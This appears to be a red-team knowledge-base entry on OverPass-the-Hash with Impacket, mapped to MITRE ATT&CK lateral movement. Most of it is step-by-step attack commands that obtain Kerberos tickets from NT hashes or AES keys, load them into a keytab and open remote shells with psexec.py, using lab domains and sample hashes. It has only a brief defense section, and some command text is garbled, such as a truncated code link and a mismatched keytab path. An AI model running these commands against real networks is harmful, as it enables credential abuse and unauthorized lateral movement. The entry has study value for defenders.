---
id: 64f2ad3f-2877-43b2-8bef-b58758c74e89
name: OverPass-the-Hash with Impacket
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.122152+00:00'
updated_at: '2023-04-10T20:25:57.373569+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Hash|T1075 - Pass the Hash]]'
tags:
- '[[Active Directory Attacks]]'
- '[[OverPass-the-Hash (pass the key)]]'
- '[[Using impacket]]'
commands:
- '[[Add TGT to keytab using ktutil]]'
- '[[Authenticate using psexec.py]]'
- '[[Get TGT using AES key]]'
- '[[Get TGT using hash]]'
- '[[Obtain ticket-granting ticket]]'
- '[[Verify TGT using klist]]'
---

# OverPass-the-Hash with Impacket

## Summary

OverPass-the-Hash is a technique used to authenticate to a remote system using NTLM hashes instead of clear-text passwords. This can be used to bypass password authentication and gain access to a system. Impacket is a Python library that provides a set of tools for working with network protocols. T

## Description

# Description

OverPass-the-Hash is a technique used to authenticate to a remote system using NTLM hashes instead of clear-text passwords. This can be used to bypass password authentication and gain access to a system. Impacket is a Python library that provides a set of tools for working with network protocols. This procedure involves using Impacket to retrieve a Kerberos Ticket Granting Ticket (TGT) using the NT hash of a user's password. This TGT can then be used to authenticate to other systems without needing the user's password.

This procedure is commonly used by attackers to move laterally within a network and gain access to sensitive information or systems. From a technical perspective, this attack takes advantage of the way that Windows stores and uses NTLM hashes for authentication. From a business perspective, this attack can result in significant data breaches and financial losses.

## Requirements

1. Valid credentials with NT hash available

1. Access to a system on the network

1. Impacket library installed

## Defense

1. Use strong, unique passwords and avoid using the same password across multiple systems

1. Implement multi-factor authentication to prevent attackers from using stolen credentials

1. Monitor network traffic for signs of OverPass-the-Hash attacks, such as abnormal authentication attempts or unusual network traffic

## Objectives

1. Retrieve a Kerberos TGT using the NT hash of a user's password

1. Authenticate to other systems using the TGT

1. Move laterally within a network

# Instructions

1. To use this technique, follow the steps below:
1. Run the command 'python ./getTGT.py -hashes ":<NT hash>" <domain name>' to obtain a valid TGT using the NT hash of an account.
2. Use the obtained TGT to authenticate with psexec.py or any other tool that supports Kerberos authentication.
3. Alternatively, use the AES key to obtain a TGT by running the command './getTGT.py -aesKey <AES key> <domain name>'.
4. Add the obtained TGT to the keytab using ktutil by running the command 'ktutil -k <keytab file> add -p <principal name> -e arcfour-hma-md5 -w <NT hash> --hex -V 5'.
5. Use the TGT to obtain a ticket-granting ticket by running the command 'kinit -t <keytab file> <principal name>'.
6. Verify the obtained TGT using the command 'klist'.

**Code**: [[root@kali:~$ python ./getTGT.py -hashes ":1a59bd44]]

> - The 'python ./getTGT.py -hashes ":<NT hash>" <domain name>' command is used to obtain a valid Kerberos ticket (TGT) using the NT hash of an account.
- The 'python3 psexec.py "<target host>/<target user>@<domain>" -k -no-pass' command is used to authenticate with the target host using the obtained TGT.
- The './getTGT.py -aesKey <AES key> <domain name>' command is used to obtain a TGT using the AES key instead of the NT hash.
- The 'ktutil -k <keytab file> add -p <principal name> -e arcfour-hma-md5 -w <NT hash> --hex -V 5' command is used to add the obtained TGT to the keytab file.
- The 'kinit -t <keytab file> <principal name>' command is used to obtain a ticket-granting ticket using the obtained TGT.
- The 'klist' command is used to verify the obtained TGT.

**Command** ([[Get TGT using hash]]):

```bash
python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
```

**Command** ([[Authenticate using psexec.py]]):

```bash
python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass
```

**Command** ([[Get TGT using AES key]]):

```bash
./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
```

**Command** ([[Add TGT to keytab using ktutil]]):

```bash
ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
```

**Command** ([[Obtain ticket-granting ticket]]):

```bash
kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
```

**Command** ([[Verify TGT using klist]]):

```bash
klist
```

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Hash|T1075 - Pass the Hash]]

## Commands Used

- [[Add TGT to keytab using ktutil]]
- [[Authenticate using psexec.py]]
- [[Get TGT using AES key]]
- [[Get TGT using hash]]
- [[Obtain ticket-granting ticket]]
- [[Verify TGT using klist]]

## Tags

- [[Active Directory Attacks]]
- [[OverPass-the-Hash (pass the key)]]
- [[Using impacket]]
